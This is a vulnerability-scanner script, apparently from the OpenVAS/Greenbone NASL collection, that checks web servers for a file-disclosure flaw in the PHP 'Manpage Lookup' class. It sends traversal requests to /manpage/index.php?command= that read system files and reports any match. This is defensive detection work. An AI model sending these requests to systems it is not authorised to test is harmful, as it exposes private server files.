# SPDX-FileCopyrightText: 2004 Noam Rathaus
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

# From: Cabezon Aur�lien [aurelien.cabezon@isecurelabs.com]
# Subject: PHP Manpage lookup directory transversal / file disclosing
# Date: Saturday 10/01/2004 18:56

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.11991");
  script_version("2023-08-01T13:29:10+0000");
  script_tag(name:"last_modification", value:"2023-08-01 13:29:10 +0000 (Tue, 01 Aug 2023)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("File Disclosure in PHP Manpage");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2004 Noam Rathaus");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "os_detection.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"'Manpage Lookup' is a PHP class that helps you to build a 'manpage' frontend
  in PHP. A vulnerability in the product allows remote attackers to view the content of arbitrary files.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("host_details.inc");
include("os_func.inc");
include("misc_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");

port = http_get_port( default:80 );
if( ! http_can_host_php( port:port ) ) exit( 0 );

files = traversal_files();

foreach dir( make_list_unique( "/", http_cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";

  foreach file( keys( files ) ) {

    url = dir + "/manpage/index.php?command=/" + files[file];

    if( http_vuln_check( port:port, url:url, pattern:file ) ) {
      report = http_report_vuln_url( port:port, url:url );
      security_message( port:port, data:report );
      exit( 0 );
    }
  }
}

exit( 99 );
